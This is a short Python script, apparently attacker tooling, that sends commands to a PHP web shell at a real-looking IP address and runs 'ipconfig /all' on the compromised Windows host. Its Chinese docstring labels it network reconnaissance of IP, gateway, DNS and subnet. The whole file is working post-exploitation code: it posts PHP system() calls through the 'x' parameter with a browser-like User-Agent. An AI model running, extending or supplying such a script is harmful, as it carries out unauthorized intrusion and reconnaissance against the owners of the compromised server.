#!/usr/bin/env python3
"""81.70 网络侦察: IP/网关/DNS/网段"""
import urllib.request, urllib.parse

SHELL = "http://81.70.245.25/yy.php"
def cmd(c, t=30):
    data = urllib.parse.urlencode({"x": c}).encode()
    try:
        r = urllib.request.urlopen(urllib.request.Request(SHELL, data=data, headers={"User-Agent":"Mozilla/5.0"}), timeout=t)
        return r.read().decode("utf-8","ignore")
    except Exception as e:
        return f"ERR:{str(e)[:60]}"

# 网络配置
r = cmd("system('ipconfig /all');", 30)
print("=== ipconfig /all ===")
print(r.strip()[:2000])
